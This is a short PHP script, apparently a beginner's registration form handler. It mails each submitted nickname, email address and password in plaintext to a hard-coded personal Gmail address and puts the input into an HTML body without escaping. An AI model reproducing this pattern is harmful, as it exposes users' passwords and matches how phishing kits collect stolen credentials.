<?php
		$to = "omewin@gmail.com";
		$subject = "Formulario";
		$from = "admin@example.com";
		$headers = "From:" . $from;
		
		$nickname = $_REQUEST["nickname"]; 
   		$email = $_REQUEST["mail"]; 
   		$pass =$_REQUEST["password"];
		
		$body = "<h1>Se ha registrado con los datos:</h1>\n".'Nickname:'.$nickname.'<br />E-mail:'.
	$email.'<br />Password:'.$pass;
		
		require("includes/class.phpmailer.php");       

	$mail = new PHPMailer();  

	$mail->IsSMTP();  // telling the class to use SMTP
	#$mail->Host     = "smtp.example.com"; // SMTP server
	$mail->IsHTML(true); 

	$mail->From     = $from;
	$mail->AddAddress($to);
	$mail->Subject  = $subject;
	$mail->Body     = $body;
	
	$mail->WordWrap = 50;

	if(!$mail->Send()){
	  echo 'Message was not sent.';
	  echo 'Mailer error: ' . $mail->ErrorInfo;
	} else{
	  	echo '<br /><h1>Su mensaje ha sido enviado a ','<em>',$to,'</em> exitosamente.</h1>';
	}


?> 